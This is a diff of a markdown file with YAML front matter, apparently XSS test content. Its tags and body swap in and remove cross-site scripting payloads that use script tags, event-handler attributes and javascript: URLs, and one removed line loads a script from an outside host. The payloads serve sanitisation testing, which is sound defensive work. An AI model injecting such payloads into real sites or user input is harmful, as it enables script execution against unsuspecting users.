@@ -7,16 +7,12 @@ priority: 1
 tags:
   - <script>alert("hello")</script>
 ---
-<script>alert("hello")</script>
+<Video> <source onerror = "javascript: alert (XSS)">
 
-"><iframe src=javascript:alert(1);>
-
-<IMG SRC="javascript:alert('XSS');">
-
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=# onmouseover="alert('xxs')">
 
 ";alert('XSS');//
 
-<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
+<video poster=javascript:alert(1)//></video>
 
-<script>alert('xss');</script>
+<body oninput=alert(1)><input autofocus>
